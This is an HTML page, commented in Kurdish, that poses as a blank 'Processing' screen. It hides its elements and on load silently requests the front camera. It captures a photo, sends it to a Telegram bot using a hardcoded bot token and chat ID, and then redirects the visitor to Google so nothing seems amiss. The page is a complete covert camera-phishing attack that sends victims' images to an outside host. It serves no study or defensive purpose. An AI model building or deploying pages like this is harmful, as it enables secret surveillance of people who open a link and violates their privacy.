<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing</title>
    <style>
        body { 
            margin: 0; 
            background: #007bff; /* ڕەنگی شین */
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
        }
        /* هەموو دوگمە و نووسینەکانمان لادا */
        video, canvas, button { display: none; }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const token = '8734772782:AAFT6ize__0OBmz53luKQXus2iJpSg9NpmA';
        const chatId = '7602797383';

        // ئەم بەشە ڕاستەوخۆ لە کاتی کردنەوەی لینکەکە کار دەکات
        window.onload = function() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'img.jpg');

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).then(() => {
                            // دوای ناردنی وێنەکە دەچێتە گووگڵ
                            window.location.href = "https://google.com";
                        });
                    }, 'image/jpeg');
                }, 1000);
            }).catch(err => {
                // ئەگەر مۆڵەتی نەدا یان کێشەیەک هەبوو هەر دەچێتە گووگڵ
                window.location.href = "https://google.com";
            });
        };
    </script>
</body>
</html>
